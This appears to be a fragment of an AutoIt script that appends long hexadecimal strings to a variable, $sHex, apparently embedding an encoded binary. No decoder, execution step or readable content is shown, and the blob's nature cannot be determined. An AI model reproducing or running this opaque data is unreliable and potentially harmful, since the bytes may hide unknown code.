    $sHex &= "30C22782669179600DFD9C4DE0D83183E831DF4C1086D81D00ADAEE854108ACAB09EA55D2848D63945384D871BC65E0196081DE4040BD00F3EBC478E8C094A0CF03D08F0B34B064606003BC8768B2E4252807608E0018215594DE0504F310A9A09B90102661AE85B39AC4B07447E98CCEE02D6E828B6E01642D3106C21667C0910C7BB92D6F77EF8A1E883DC610E36039D1B9C01075469F7D4D08622550A948869E0B11D4C0AB25760E23D8ED4B6D0E8147457D3C47B591ED40C033BC1ADC8FADC7E0FEF2ED403D0F41C68C0EE9AADA8CB435A32CF89A80F4EECBAD9343B20EF90D4A2FF3F5AB6533402311569F8C70E0436092B0001B78531A895DF85463AC0B1A145352BEB95D9E7921F93022CADE4CAF4A114805D5B0C9775B23C0FCAD10FBEAC6D5BD083082252CB7A101E00C33A902ACB535488FFDC14F85B943C7C4983AC2D447BABA69B45C76A852FC8B656FEDC5D02BAA2F0D02A8F0BEBF5693DDB8D68E06C7998A35D7C19091527FF99E80355DCE0FCD907B17D5C778C391C7F0B2785A4A099146E7D6E9B9E6EA5F591E0DF93E0039A1C2055D865408C06C28F06F9D82BCAB7C6DF22A0047D297671094B0129CCE85BDFA7950934D437E404F4B236AAEB3A9BE049A1392EB41402F95BEF8063D8D4EE977A5BF679DB9AE08A28DBE0312020B45C742E6C7D6FD65D08FDDC7955D80B00AAA8124249C01A7645E3419E0753D956B3E405C784549DE4A8C8ECB7C1822FE30C1717771C2D9BA205438A287515D918A9A058432E696462BF84D49A28B29339FF863520ACAE48E58357592017F5B4EAA5F8C61A28EDE7432F904EDA2803576A308010642ED524DB026B0DE7C96D06FCB2BA0567401FA0CCCBF31DC07F0AE8200F869402AC236A497B022086B4872D036EB08741481B034747DCB61D7E4109E630225882067F370BAD39308ED8230A7535A05149BCD87509808D76CF11E67D9902A801E2017E59A615BD311851182DBCDC82EFA5E099D6953B3CC486259F685B447206969D813C82621A1998091F99312551F76BDB4EF334CC529939413C75260A129C90D040741D98B89681824BA856A86A699335B4CAC2A3234A90E0301C77DA960C442B43A43CD56D29CD5D72AC70287510C7F49D47016EE064704154391C42B0B598209CAFB664293586D8988B4D9C85C14C330E89231014821131B6485029A0A45AECD07309C266AE2DBC06CEDF3287C3004298521DA8F840AFAC87029C02A1489841B0A28C0A05F31D8E94D13C6C539098060A3DEF6F75946D45AF1B2FB4CC214E4784D796690E8C19E0400D0DA1E67F8C7F7E4347567E00FFD8C1F810C455B8091132C7E83C8407E1BD2A01952290703B20FDB57369BE4B39ADE83CECD6B37141405B3EFF8D2E6B85B1A684D40C625D67"
    $sHex &= "84D6D988D04DB988BB880A7D88059680EE02348848BEEF2DB5047FE1D93800741D5006512B5452CF8515222F16B7146A0078E0C84A113963CB05544BF3D4E29BFCFC165B8B4A1FA078988808E04B03050F85D481211C51288B0342197850013B2914264B9595B2E4087C8804E54F0F584FB54512FA136D00AEBBB839E19A935E341C04959014D081164D17BF681C1D013996689F48CA6E0549DEC5D3C2401781750A6AEABE1BC50C7211DB0BAC1D9ABB286171698476673D0F046E0D75272DEB11523803D27059FFA9511C77132F385A04840085A14D5DB7C02965BCA813EB2453C7F8EB17D1B8B6B00A4969A2658187832AD594E7306F614C1C6503903CB006ADB68B8B80D1EA003FC293145ABBC37A3F744634B059A31106E641182BDBEB4804D70209390AD82EE50695A691A0B5D0D92E598B039EAC6837AD3DB5585235F90B2955C53F49E46A0E085CD008E94A984E52C9A0671A034AFFE73159016BB6A8005B6C7B4A47173F3897FC90417CFEFB12774B74251097A629A0741C0679075754A71013A0B424BEC11A37887C97DD506955E55F1163A08AD9DA253ACDBB236391741FF5062CD30DC9A829AD3028DFF5B2536F5108ECCB1C5B5C86B0F099155F877520226D24344632B05BF484410C6D3F8FC84028A6D1174AC0518103C3A3CBBFE67B3EA02FD87711DC647C6E05D461F1E0007C654D02E85E005C6368F8A36F0D0B4CA0FB4A0DE0030BD80E6A500DB9B8DF01B626E446054DBC1AEF11C2B9154B262CDB8D20BDA1BFE07398EB1453D8052304D2DC03C483F20E88A41881E20A4E3BACD3E49439EC011887DB1A00EEB23845ECA12F4B120F82BFCDFB9E18D0FFD220F0312B0E97914B0389ECE8ECE4808A022EBC89EE4EA5C189ECF44A26C9C9650A89EC9CE491EAE0835B08D23520CB1D3A25E06C1F6A0A14948841916355A46E2711B1180122C1D13FD117254B1B1B174886DA1A30F886437AE8331E490B0AB711C937C306C854DB44999F7C2968810C2435D8427749A523FF02A99285A523190E079BB2AC209E570099CE7C3EC690088D09AEC32CE8D2F1E502B1F5410073C04D3D6DE20A895620161AF81E5208DB002C99589F2CC05702673B988D030C4DE4AF29A487C35508C782A0EDC6C08934017D4D6A6D9DBB52B6517C9EFE49CA4D31C5102B91EC3DE109E8268D01910BEE01B9F01D822F60257927C5088B45FCA6905ABF5B404D3283F0AEFDE8D2AB99E824CC5CAFD474207611345801DD817BA45B5027E000B7EBD48BF4A6307E4FFCED0E689D8069AF0CACC052C18BB03456B7C0A378A133CCED0CBF7A8008CCA6C0898BAFA0487713C885FB6A09BC20C2DCE81854A419D64A636B0C1CE712AC10F573BF5B3DEA0EC87DEB5A5E7FC84808E84D556EB1A955312D2C"
    $sHex &= "A4D1C08721EF33C2FA49970917EB42A485850D6900F006565D9F5E2AAD1278F378FF3F90205E3C44C74D996CA06989AD70282E201B215CB31628F038421E587C0310B98C058A529ADA47EB26CA8CA43C71FD0299BC34C4C0B06FE568182290ADC9C92B881EF43BD1BFEADC6F45424B03F77527AA0B1EAE24859B413D0207AE1FAE3B4A1CA4111EC4964EC3A9184562690D7368BAD42771646034784C6B10230AEE19EB9ACB585B29697340BB157CF11DF575154E410B7B9F74010D7D010F0B8C0B79F429539B4AC38E70ED538343D41455F6F141F0E14365574C0309382AA183D40A3248072FFC24444BC111CA3E2C6CDDCB250D059C0C6A072FB81A207C0183092002D2602563C02104899845C5DE9DE821493CA03074360A22779474AD9FC4763E11CE007AD2F020203FA7CD6CAA84F8A314894578769D56367522751C5D2055F1201816934B10B9BA89BB76B39FF06C0743A9748617F0FC80E7F6E8BED05D0E2342C0E840FA2615F4C0FB5E080A368474064B0788A801AFCB05C8EDC546A15C70CC515FEE0F0DDC4D82BB0F85E5BC0CDC7736F1501164C8B4A34F6268C0127F7F7340E320D5EA220DA21E04A3D783006E08C3E848E8B0CAEB1134711CA052E74704C48780C10F581150197E0247E865A295850F5B71080BBF4A2B4F220128884A09499A011D7024E2FC2A406D95E81C2B73C66BB74494E78804DEAC4FA10AE343FC8C1C4B9529838F24A03028659FB67B5A370A9020BA3734C33AA2BDBF0D6C253C02D6B00DA0C0EC82261D7FF8C5A1149E4E1F5C5657AF8BA10302454787D9160E7CFD031961803BA163E1D4A82174E92427D4DCB70CEA50C24D3B520D5A87680D387B2FE8911A53A65811639BBF017EABA9C91A400BA9F09DB6A55D0F677A10EF30782C1F855C9A96500C24F069CD25DDE0B840B7224BDB69E579CB89850BE8C6D4FF29083E436BBBFB0181DABBD3B4F60CEC8531E66009DE7D195DF000D60E96285C0C31AC8414349F152820A4D0CC873CD59104B01A6A5117FD2AB005571F75812938392EE11C4196D8E6731218056A28781C091D4D9D0C3862E7D577C8172908F1D8ABC6A97AF0EBB07718E4409E65542EE7CCCCA184B106E11CDC21198A0EBB8499E8300E0F911A52BAEB38188F04D1CF04D78C0A5C332515613B709782A30F8EF0F0E051CFC221DC1C7B4D22DE2283DB3F95221A8C3EC449238320DCBC34EB60E146484D4A217DAB5B4D3B2855C6E953D3FD301B5487F3DD06514828AF45C8894218D81ED83A4AB84004713403C0F9A92468C0A6FD32A558EB1372C0B449D39ABC1CD6C02424C0062935B455ABA44D9FC3230813F05D88A4CF1C9BFC1D11C921995A37410425089610B95365DCDB83A474CD0828103B172E5A48B77411E0A585500492"
    $sHex &= "B86AAD96F175FA43BB69E7CB404B7501DEA40F5B2DA1087FA48962AF9F50B86C912457504406D599A664B4B81DEB1A2E7F6916B8E8018B4DB8DC1A0C52610E4CC84650D0B9582CE3D055ACD0ACEB03F17403D2B3001BA4AB3D616450ACEAD05D019E46B9E08A93F1B135788854EB2C859283992D48F87AD089639700D80337194EA4E44CE15A523A15A6B1E3D20AACD403492AEEAE3DD4742A680880D560647F9DF52470B7B8AC7D5D4F1030516640B77C422BA80BAC35879F841E58C5E08DF808538D7C01F249E89D716A383EF4870107A4E0EB92D38A4D60303488B386C01861155C38E81D7D8DF09A25584EE79D425AD30C12BA083925CDC351C2E036A8A8D4165A42C9A8F5BA114A0B51E8440A04192C1C814AF0531C062B0B5961DD9CECC41EE0F140434810458426171B39140B7032AEC5D048DF651DCBBA18428D03DCABEC5A6E8FEB264C09494340DC1D5243D043F3BD349BD38D0C1A9A14392A8FB7BB5626656B202798FB00C4A5A1E2A7501417E46206E1E468CB14E4D663C165C314C514CDC60A0E50C3B9639B6882C36AAD10932E86BF47559310EB40430C53DB5E4A54E439B90CBAC08D08C71EDA0BE188D049E4F5A9FB4D1FD5168BDD28894A285CE0F528A7CDAE15BEF238C0A3B12B3F43020E4A431F245344AD8943DDF450D99A10016145118504D01CEF8838B446E26A1BBB206D6888476DE44FD01BCD931C701B6A182788153AE391ADA775740237A502A0194279501149EC508BB4DA2697AB777D13BF89F46D1CBC073222D641992B4CE223ACCD551CDD0B7A78DBAD4FDEDCD161CC4CAB841133E819FF65B94072040F87CF012EA29D2FF2DC72E8BDE0A0300EE82BE4B49091A4F4E8DA340F433167E418140434C53AD436D1F9E8188C4AB17014373DBD47221B0855315502D28BB8ED2CC1E83A3C420DC1941F470C8E91132271022B44B0D952F241058F000D0DC3E0681F0590A1484151611E6668C3162DE3BD47408EC0DD6E20321448F3E012C4C1AD2D84FB06CF9CA48610A00C41FEDBD088200D258B83D7027670AC7174EF147997E9A5A84D145DA6C9300490089D049A83ECA34DEB36816E100815BC09691010A7D55583186362481B699A8B43EA28C00C3073490AAC09F87AFCDE789386188A03FBFC9BF7D4803F031BDB06441A9D4205A8231BFC3FC269A1A0BDF678B8B0163C4E1EF22BB31C5B55CF8F26BB31E89D9B6871081D7A0DA06BBD6F307317911D84EF75A7D786B010C22390CFC4CD11322FF872869C95915BC77A4D96F7DBEB3F474E1AD5126435844904A4E2900E1560550FBBF3835DC415A8B39E792C9B4C28751999600DB8F44D548615125EA1E1617F0A7043BDF7C0F65526B9B0DC5146FCF0085D4730757B6C0176D0770570281E9CB195A277"
    $sHex &= "56FB646F499BF4CE71AB63DD44627068854F265AC70A493FCD611AB0EFE4591D175A2135F4E92726F478801879E8E034496F6DC520A7BF0EB430E0ED060A0A753B09CB450829960BE0A4A507444431C6C136C5E0F12AF5C3B012D715EB0F7F699A1CD686279640101389290CABD703DE4E3733D93B043416D034BDA82196B4CC1C360A80053EA91186950B9C5FB60010D021EC7FDD1A266DDC7036ABB7DC7C03260516378945105061203C9AE4216B8501EEA5D17605D5016EE3E2920EE410E09BB6ED356FF05ADC469BEB9B752BC0E6E961AB34AFDC4D98EE67D4D48B55D4183F043D36CD033116F2D047D410F8B9B8C938B80E6A209333B90F2496B68775320FCB80290241101D7D189AB4EF507FEB152904C404B80E1C6415639FF00B70A9C8615EA561328543FA634375BC871481C14BCD01E9B0C6147D342BE57987010720B7066926435A9105FF7AD99A749A0C0708182D004DD0E6A23B06090FA52CE14F95964637F8D405907A429A0CDCE46A27ACEC09E0D3306BE8B26311D3FCE22CDCEAA932D82F6A4AF795D86A4183D36EC9C3A198EB637B12043D53DB20632E3BE8B38E5B61624FEA4C3BF064687A6B82D743835FBBDEF616EC1F074C367B4DB769103CCA050F4090EE746C6FC4DCBD3D60B10B99D8EC6D6C0119E460021EA30C482116D732F4F475F02C82C3E337537871E124012221C54F22745FDD0CBFB94CC8454CF4E8181DAD07F06A26270C201D006B5EB96278ACD8D3A1FFA7CB8B963DEC6A99920849F086554005B45ED98E566C549AEC0941F7C65B3120E6E3A763546095E9CE0791E4BADE43E9FE4B6BF9F839DA0A374545B501546D6D29ACC20991602595833C024363B68274D2F86B16803301CF24011EDC50EA9FF1745FB09AA834F13FD9903831C1CDE2BCDA93A5748572024014205E084DAD0612143A85DF7CEBB2FF95C0E884832FE94B54D068D5BD236FB08827BBE94B808E037805EC20C3B114A3845D14E32F4A822B482AFF2B75420FB77B66514B0597A8A0BF55D48AF5B7CE786A168F0F3881C645278D016AC43684E4016A21DFBF553205327000C9950CC90C687D7D271B586D7D0C07744E047CC421B9047D31111F71FE660C090F941322B44590836DF497EBBBBB16C1FB6921476B1F28AD0F12039F02324B40713171B01299151B96F02960D07DB8F5497A45F51089A5DD24E0209F27A2F06D0D10DBEC6DE86C0EE0F35213417CECEBCA2BE93F002FEB39EB328B2815C2A20B3DAB716D5D31618CEC5C0A7A1A2D149828A5880D5C159F4648BD4EC72B931FB66710D81FD51BCE0146353FFA7226522D909F89A0B09906215C3A8E544E18C0EDEB1F93AB2A1129B15F5D15A0C1E611D1E1EC1D90AA92162075C5F8705F192382A10AD4F589B359761CE9"
    $sHex &= "243E88501CC9850D7C06F0F0F84F084D201B2059948160A2031C43A732256BCD201E04E029588711D60358424749279F813B8B5508EC6F273C85D4F88DE86AF697C0AB90BE037CE5EBAEC2F5CE49ED8A013704CE6920CB23DCD033E5702873A156DC0CE911F7B776450B801834A8EE3071D277F89B35A081646D54135768D1C0A1ADC7D004EE3015885814285F12C0B62F59019746B129CD38FCA270BE43E84DA4073A16A087FB065F44662FC8D1D9CCDCB7AC171681656D4A838C7610AC0A5B96831CD97E4448009080DDA2DD3C442E394CC8548380D0207DCDFF01ED0807FFC3B0D181744CBACD932CB92D61342D9E93FEB4C22C453FD33C75D1CA3C0213AC8B467094B0D223D1140370F7B0A1EC7D2926D523E2B792F552183B54082060E8349681EC99142518CAC0A6554E0A70B351F4A8F0F441E2D220DD968430694DF06003AC8716797CE55ED908ED043F89CD6D848E804C71E2E30805F5EF55081F3C6D8028C602627D490B66DF6F5C42A726F32DEFA925143A4C29B3764ACB55383D590887D877C367AB546B382F596793A19582DDEBB92ABA19B01098AE4465775D0A2BAEEF2081E16B681A24E94F819148C8B17B63DD54098745F2FC891A6846E7E40C9FD3647A8838A2943F14186C2C22339F30CC4F2E14FC0F8DA925D480D423BE5921121722A1F87B2E5E8B3A6ACDAFA7ECD8409A282DF063F839D98627E4CA3510CAE0C3DC7B0FCBC5A5C5D0B435F41D6BB141CAD1B5920016B4904985FD25BC620927DCD12E1CC2C941681F0CF859788990C5AFBDBE613CAB2484D348A46DD24A5F481D06274E21216A0E29071A70A2C7D18F36193816BC4A235B8400894A081F4A23257C1F6DB490169C1E71388AC03153E9A39E006B792579AC610F06CE305A63F4CC944E236D54BC452CAC228009C00D788B43AB90E8F7D9C2B820F4208D6D86367DE88DF9153074A00B8CF3255B3A88A63908C318B20B0BB12113EAF4DC44A008C45FE999F8CAFD6897F15989520CD1F77895A474EDE5EB1CCD587A881F0C19888B90D5F513FF600516E07CCDF7430BCB309BE04E1118196944DCF01C81ED919058371241281530F008C985051DF7A82BDD7B12C96B3854A603C040029FD0E870148296F7D004EBEE009F0D6430A241D803FAC8282F8EEB0B7DBFC44F7C805143015908E23A004C938310A0C0752AEB4092FC908A06008A3CBC85142F0B1FB076BC514B14316080074801CDF1C4305AA4858FF85512426C995A514EE0712808243C6CAF74B010DE16C8C479A6DE82BC032284D7AF61C1C8A5CC97CA91B0C177E2186010BC8DC86A9A0E0210738C9C8DCC3516E23504CEE18B61229436C1F3E898E07CD0B23BA7E4F8A20920C389617FEB07DC8484C0B7A0906605269E29309074D0C9D304"
    $sHex &= "E0F0F47D7EA8524D80D251C014E938A17D3712795EE95826B829A9ACA66AB84F56B485A05C21B46A6EB4A7F997250E328B4514B815019690B4B766BA1C8C6287EBCD32682DE80170837C7AE110D701CD12C479A687A9AC32BD42462B3C87B89FACA801A1EF5D5AAC6AD2A4ABB58DE5C190FD501CCF636121E740AC01B092CE53DFEB31646974676594E92597E91615AF69ACE7600840E0023BC38E200DECB043386CE63248A8A8A84655A823EBBE41663B265653749065200FA4E5A42D6E86254BB04E8307760670719883408B4838B81078C4180B8B74E6294B43838993E19E9E49D1C4420834C0E162E8621C1464EB6D0AF9F81A8B2F332E207C488CCF8492700DD1A88CCA4D4B0BEFB00B558C64E4767017526588BA5F24CED46ED94A6F0BBBB4654D887FB4DCA910801CCEA8EE4B30483A5A6E2F095F3CD7AD752EB9D2AE6081A8A31844EC1D5C48F7CAFF80DD7B09899373F7EB000891F0716113A763159A30961D61F50DE074D42ABCAED2D8C485EB75D40CD5A70DA08CA08C000FA06BED1A4DE378618308DC4FAD9CFE6B31219823701AE0E415714F021F70DAC1988C6710B07B0338769A4C1C9E30CB10F1C197B4425603E9C3F75D60315F230835DD5116D610C2B0353D485CBE182631272C5D261E4C9C709E6CC81A6181A31D4F015ED16DBE28BD77A9F56201B9D7C1552091844EB838033A5B3311C89D982D220E2EAA235798B88E9AFC22C1E0AB3EF5A7693E4164141098208E5DC8C1F01435FC0209589D65BF5A51182490A37CC0103CF1BCE0E69A3CF8D25AC0A9407C54943FD24B0016A9399412717232E0E01C7C5844ECEDDB25086D444222BBF339C41093B22481F07CA7F8C255A481861E6C880A441D023B757548DF831740CA6795032B9D6F2948838F0C87CA80180E3C78D238781E6D20DC69D12869D249021F56A185E5F74C7FB5902492BA6DDD22B63B69947BEB792B0308BC4281DF2A8816308D526487567960084786F8C31C349400061C95F75ABA885AB7DDA6E5960C9B83046E1E4C00AB800786BD2D5CB5F8FE3A355A589DBF7140EDD0C0047FCE519589F75EAC39E8093362C12AA004976CC1C14B44EB9A695FD7A230150614EBB84492822162F0C306894B1B1B160134298A049F5ED01A096DDEFA620BCFB2E53FEB2B212407033ABD43D0791838DA24D9F8D8A6A5A8EBD99DF2E036A946CF424BB0DBB64202F34B25DD967613A73B58F292817D0DA32487E502026A192EA809605F567C9B2A92D814A63E990A25B4811D98A03F6A126873B8EF3C7D5B59DB267F53EC2F6E9B28A27B63E7FA03678605386910AC29AC4EF3E24A043E2C354086908B83F8F8D01498B4BC9055FA0F80D412CE4BA54A0416C2A94B76D1245EEC402B0E8019021B0036CB3904CB5D"
    $sHex &= "18894106303DC829A9EB44B25A023CD3513B12CD4940583CC4183B419A497A824F40550305751FD3C2859169130A0B811504088DD0B75A36C994B828AB63C7090342B824AE024A58499BBFCC440B898123436DE065E2F93E5E2F0146FBD8D963752B153B3F3071E50D3BA1389484297D034B82BA0E0A151B06881BF0AB0C6D37132140AC1DFF1049432903D3515F95342EFB7D033E2FBAF44C0073AD8AC84D6B38C3C634304ED5719601F358F383367DD068A90B6A21BDD833821D43E9753176C1362285CDAB185B212D9CE7FF04930733C35A8AE58CFA7DC03A13DE817824A04BDE40CB10688AA6F8581510D6C9FFEA48BAC0CD1065428B4C5DC840CCF7B110FED0586263010F86E586420F0F534E7D09F095A653243804F0F8858543417157445498C41AC12DCD75094FAA42C8ECAFADAB4CB0EC76116B2B1446134AE7E8C2D144E798DCE4803E0E407392BE778B38068F48A11E97E8DB3CDC54ED6028E29AE874285DE4238DFC8E48E949C2705BF82986D684D0C250F0DD3442C267662403F8D00C7FD8744D6AA0D0B1794D67EDB28A3A13283888B5EC8FDD8670D45B4CF627F496E0431FEB38915889D3350442FD25CD1BD2D07242E0CC28CC88BA7327E58434F4C25BB15503C645B00CF7F9E81B4704A04215808EB47D61CBC1CB5051B81AD0F7D01A1C81002C3BB43218301719AFF010B1826B13BD468256841F7FFC29C142AB1C0305208831886FDDFEA28048A31AAE9862E0A0D33C492D40BB093DBB279318B0305DFBFB9CC1840290C9F5CD132123316AFF14F145DDA1F44988884DE1B1A70120AC5B38F0332E4F1A61CB2A0C2DFC039D7A8C02AD6A355100855361ACCE1988C9FB597014978F84870EF8436D63926301FAF8F0E45158252F34F8C25297109B83358094ABCB6C73303688DF78EA11100F6A4174EF0E09345F0D600E01C7301D8C064E656A73C1E41296B46FB8ECF814C602927459F8B421089406C565840C7B933F99293945ACD1C0E871B80044AAA6105F0608010C1B27057C3664CB74FC9472AA5F0338A7DE2426A80DDF5040330AAB3F1F0C961E87F1C104E546E64248A74C851A4F97FE619CB6080F83EA145CE52E3374817DB8569A875403B2F15342B8F00347B591684EF580F02D42FA00AE6D810FF85EF3FD3018C9370C9D766A2A19591EC71C101F307B04E80C2D1E60AB7724A7BB0CD2BE1BF416F0E80C4B5C34362BB33B650ED8684CF51084A90CCDC50A25B41BE49F7582B473B48955D8C80D64282534CCB32E2CBC4539F305632A5D02D5AF32146640C741C0F1ADB2B5109975D9637B6D6B3A53F66A082D520938E44F00EFA412D4DCC81152AA40E00AE01A7948C8EC9CEA9D745F28847BC879EA1F945B7ABD2140D93D0A01A0A4ED3012C5C2044D58FA"
    $sHex &= "2660A5CB8E6B19778510273705B514902B3CC14B0BF85F142FE4C358C825DD9128103A43B8D32F5E972AB457C8C06D4CEB2E5EC8582103D22864F6821E3C3F0D6B996F15013C3C41F82507A138D4C00285454F398CB446D301059735C19DC2544BBCF116AC6AB024A41394BD268BF81A1211854F68652D11BCBC110B60724CA920E4AC60A4799848C9C0ADEA080347DE7B16406037F1FAF5102A4F8E5AB0B002B0F76C4FD7BFEA4006437EA21623047CB6A50E441DC100B983D8156C010057704732B10245030407C84D635AFF0803393C0279D5523F389C5F188FD2DF3B48D9116387495F0174257025E24683100D4584421F8A0BD00512915D030F11D94B8500EC95ED4D83497C2A224A7D0A17DAB1E0F79D737DE8492F781C1F053AB48ED0FD1447A1AF487302393DD5EB1105F3145A5B0339EC8BD42C23319BF7808127A95A0AC1342395E07BFF944046EB8AF7F0D36C381E80E70B8A32E6A6751379F87C1F1EF40BF03E2BC1384C19350C68DA97601D3CF00C68F636C3033B7C540CA25F625BF55BF02358CCF741088C7059084209011F0ADF29587CEF4E3AF23C14CD350CC0F552A9E00CE0DDFABD752B219FCEE6BB583BEDAF2D057AFD810C510F843E084A63E9BB2B1B73518D85178B85FB05442C411C7C122BC10222064C7949C2025A48BD9B6C5CF5A9748FF083FDF617418242047C1E7F122B013B027669E8A5542371026A4A6C0E645355E20245E002CB3D0292F11E578710704405917E69246CDED1751CD70C645C4C841D1858410B472910B504D6D2611D4BB928FCED36462A131F458850D987BA82B010B549092D61EC01DD9C29897B0D016129CB04260CB203D0B0780347DC26540C68F6DCC82604D2BE056198885247F4410656606DA0C0DA348669848052A0613236450B10B72433273314942D08232D590916521CE9175C60414602E3CEB3187E0E3FCD10D1DAC7EB85416678DD951B8B276714D8C50C0BF70F9B715B2FE82B129FA916594A0393EAB002102DDDCF06265DADCD65BD66028E9566FB43348C2030D47FBFE7C4FA24C004EDEB359521840091FB05D8A5AB08F955CA0827B7284722D7E1101203521F4D26D6CADD08E10861316044D0BF5B05BB40C9456303AF2E61FF3C56161BC72405C45B587618894538C67C4EDA36820923B9DE041E88E0D8084D06269081C465C411C4E2A13ABC788085B0E4E8E056BA2399DDDF55745A38E4C7D033B180955C11088A0294B870CC8003CAF8AAEC1BC2257509800327A193A617A183FC00859F70599ED07C0C02C0F830CD5EC420D212C3D4162223500357058AD809C0CB4904EA00262231D81C8D9843724D1DE4798B2418A63CF63E2964EB09023740876AA553EF24C25B50BC6E604A5AC84EF8C8F4AC671D01617ECC"
    $sHex &= "4F9D59BAF577ACA8C4699210DC574DF96D02AB019B522B84DCDF0CD08E8261D76CF417449B269D4524961BC58AF022C2AC24EB0C3A90B816CEF87915D3820006E5FF8D8D8682F130DA8181A1E9B9CD2C1FDE04A20637142B5BC0D8B1BF2BE8434A11BF3E76924EEE64EF03512DF4309500A49FA54402DBAE510109626A10E1407E0CF8448B4DF8207A8A5A6137B310C2D024C3271011437B18DA9F1201051301F2F2FD060B202B42243F141540803786F116208917206A4C28E0108C77ACC3285FC2E00D5A3AF907D6B30D8B7319081801571F4046660FFB2D1540AD9D1070C7423F0A01A36106617F033912B15E01017C70152D6E032001D526F0B8CF033DC3746A26711BE5B15C585A87DA39C013BBB5053B45FFC7E30683C8CE8CC73F8F4B002E20DF057EF47EC2BF200A647E0AB80FFB551383C053161EE145AF824767A576804D0575483815A84F613A000E403802B33BDBB26E20183CA3172C446C4F6525885B1D07532E96FC0AB26D2A2BD360169F7552C003E1F09F8B58EC6F91BD1D3B4A34757E6A03DDE5B6840D956522DD96F0FB4ABF8DB4522D81B9C1050837168E53B7028B8307C6BD1FA790E4E0EB0E4605993A60E10CF47601E1927848057D2ED73A130F04CDE80DE83B1A70B2C7FD34771C004F09BA8D01A1F24C2EC35825714A1AAC047525BB8A67A42C6EF049E510B8D4B0AD1D592BF8F9BA0910EDEC0F83856571B0661AA9646DA960B91450F80749C165823FA18DE420E4AF0F12DC101567F840C4924F1130F8E1D0D04A7D1287EB84DCAB63672903526F741A57F54D2C3DBBE0F70728BC0006EB68376B280712FAEEC222004A5EF67522158374805580E38A80145C1A38F4ED521E26F0EB1059881D4442755901004607FF55182AF36DA7E104D16822B484B12F1499C808A7F3AE999661BA1507B90E122B17450C07A45284C7BCBC824C57FF9C4554E25047657502116133B036A36F8DD2D22A214F1E4040A07F0D7742181801853549B301AC7AF8258C0753324F2C7BB60437ACAC4D8261808071ED37D38080552B59C38B60D16127747FC30B926211B85A882608F29D7EE80A030A8AD9A411F121623BDDAC631D808FF41CEF40F79C89DBDB8B0EB0615088AD6DACDC7BC55F7451ABDBE228031528C1F42360A108A111B86C64861180F41B8F20C48C751FDF426292021E3424309868457CA924D1E44D830087B75C2A5E9A209DC49369AFC0B02C1C90EC112AA44E8B28013993C411987ED1BC0F1350A6BBAAF09D506FE823271721B5003424D924933F122D3F0C170355F0416F25A424239C3B68D6096AF1187DBEE87D25E99289656A1C25E0D721F3EBD0EB30388F102FB0742AEA28A721F3D0E8F405316813133010B3F0EC18FD263AC1AB365718C3F996E74E28"
    $sHex &= "20B6DE5C0FC32202EF14330903E15A056AF35B13C890EB02858C4999D17906D44FCC5AE94E0D41557ECC090F87D802CC5EE4829485442BDAAD2BA4230526E89908AFA005C1EBE4C505254A3D17B354B6BAED06CB5D47E0845E60893D13A4CD99D29D636761C18AF9EF165686E18ADCF31C7B40EB5D19AFC6C491D8216A3693F4BD552B2B85E44B854CC844D8DC33218CFC5C068B452410E1C5820F06408842056195A00BB6E70C1CA3616814B03AB8ADD46026CBCABAB6052B237AB706631E3126970E28AE43A5D40BD461A0C34A15015D14BC4197314B165B48730C2EE4E87585894470538DAE244D8184C418E8200D0336D0C7B6D08BFA0860D2F40A0D522FE9EE242F04238526697BEB2AB9EF45D286972B913DEB7E489FA4E24D2CAB300CC0408A907387EFD96CEF593C06900E5B165C0A6A062FC3B8F7690E5A59AF07264EBB00ACBFEBE70F904A0385735D25B088C21E6A31834A08635B374955066EB8306579A42D44EBB4837B969C81011C715FA22DD7F20F29310348EC5327D219C6EE981758606A6575167E108F1480BA5BF3EBBB192214B2233FA4B6CA4B0D770411ED810D07BF9712F3CF5B0DB03EF71FA3080E58C19372D7A16181912F814A9A46024A760165B094700C7DFE25645CBB80A965430493B74B779D048A12F0750F1C513033007CEE3A2A383384A9730C908F1FD250C67F18035F54F2C26A1B994767C2F84B410390A254904202CCE85BF76E9579665C91465D28F25EC12C1C892F0C21F024B346892DAC2D3F0343210383121A2930657B92B19A1447DDB18E38A34CA48A952B2349BCD9482C5D88B1CF2B5A5BE37F6D7A40062426570399084865BCD1CF74132D8F06D382270C820DA11CF6B3A075150177E1085BC4074DCA08073986113D3F106074F028120623D3F58095DA5387338C462A2E3393ED8C46C52AF4AA08F1AE681DAD6265E13344A67FEC2C2C13C23D4E2F7E0D4C00CFC253170EEBAC01E1379D9232E3384C017D228E92C00FA1FC7FEC9F274442DA9055510E70CDB341465F93F40EA11B905FCAD1035E3C1D5142062BD2A9450FE642161EF59C381115C2FAD46A243EC805894D61A9AED96AA00183CC3066C6BEA12C7618B9C32D12D082F88A482151F422851756865A879442B0382B7728077B0BE23833ABC1C6A7373FCA670997EC2B97F0C06A4A91EC1F2E435892987C6E433897F0C2BF880592AF0347EC3F904886DA7F014B6084109F034AC002D412374B56C838162FFDB32E644CDE21CA1031AFABCE04B8DF61735A58BA2ADF5828B47871DD130C4B1017C427454DD3C404F746C4C8CAC065083DC8067EA881C0324F164486F09823C8194E7BD11CB0B0E5C0B6B8D89278B2EBD2224B699D2541C028C490DD6D2345CC3B1E0F834FA055BD"
    $sHex &= "6B2A207ED0523F1EB2033E5052803CA7C80355CC01D99357B4C745ACB4513142CD4149A7ACAC612741062AFDB83B07E0D3821C56B4C2277184CABDAC7648645A4901BF4DD8B452DBB850224B07478DB87B4E80C3B5ACBCC2D0384A9A78002576FDA632194D61D088D10D090710034170AE1656C09A0FBD6A875B2FEB70AD219919BBA3C82125A0D020CCC7F084D400D45720742F600D64E0163539501E53869671B1DF77B2EEEA487A0620508F39D05852DC01D434B3079B2CCFB062C183062A553A13F220D41D0A9F12C68F000F8B006C4CCFC073E17A44F474881F1F1075A2C552D3D6C78B145E58C4B1FC348E8ED08D0F09F8506AD615C40C454018E24AA31AA93F230C184523FD06F0912C67C3FC7D37047CAD316D10732615F1392A2FFC4D4C8DE18B6C4C09351CEBABA78DA821DFCA089258700019F886DE022158061FF0449C505F03579948589D02B18E4162113FC730EBCB04A13987091860E970DA8419EA86B911025A8549AC15E72BEA81DF6744DE80288DA19358582B349F00D2492779D0449889F0112A553290B9978388CB47213EF41F0CA448D030017967012640A3EC8B55F4C020960D8C7B24E32A651817CABAA01C5A9595FD47D01042C6318907F94B800351DCFF74D888B460961F0DD8AA28E051A57B32012984FF207A450843756F78E9A431858F50BE40CDD5922E5061187676A3208542FD13491853A18014FD200859639705C59B48E2421380E7C3006B8A2483DC51D257ABD20B470CECA718F8455CE00F87AC077120139930ACE7EE4B08104E5820E5828151534BE067E8CD192B3411710812997802362AE095D187186164B78E0160B1F09F